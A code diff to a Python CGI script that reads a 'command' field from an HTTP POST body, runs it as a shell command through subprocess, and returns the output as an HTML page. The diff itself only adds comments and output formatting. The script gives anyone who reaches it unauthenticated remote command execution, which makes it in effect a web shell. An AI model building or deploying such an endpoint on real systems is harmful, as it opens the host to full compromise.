@@ -1,20 +1,18 @@
-#!/usr/bin/env python3
-
 import os
 import sys
 import subprocess
 from urllib.parse import unquote
 
+# Read the request body from stdin
 content_length = int(os.environ.get('CONTENT_LENGTH', 0))
 form_data = sys.stdin.read(content_length)
 
 command = ""
 for line in form_data.split('&'):
     if line.startswith('command='):
-        command = line.split('=', 1)[1]
-        command = unquote(command)
+        command = line.split('=', 1)[1]  # Split on the first '=' only
+        command = unquote(command)  # Decode URL-encoded characters
         command = command.replace('+', ' ')  # Replace '+' with spaces
-        command = command.replace('%20', ' ')  # Replace URL-encoded spaces
         break
 
 try:
@@ -22,6 +20,8 @@ try:
     output = result.stdout if result.returncode == 0 else result.stderr
 except Exception as e:
     output = f"Error executing command: {str(e)}"
+
+output = output.replace('\n', '<br>')
 
 html_body = f"""
 <!DOCTYPE html>
@@ -128,6 +128,7 @@ html_body = f"""
 </html>
 """
 
+# Construct the full HTTP response
 response = (
     "HTTP/1.1 200 OK\r\n"
     "Content-Type: text/html\r\n"
@@ -136,4 +137,5 @@ response = (
     f"{html_body}"
 )
 
+# Print the entire response to stdout
 print(response)
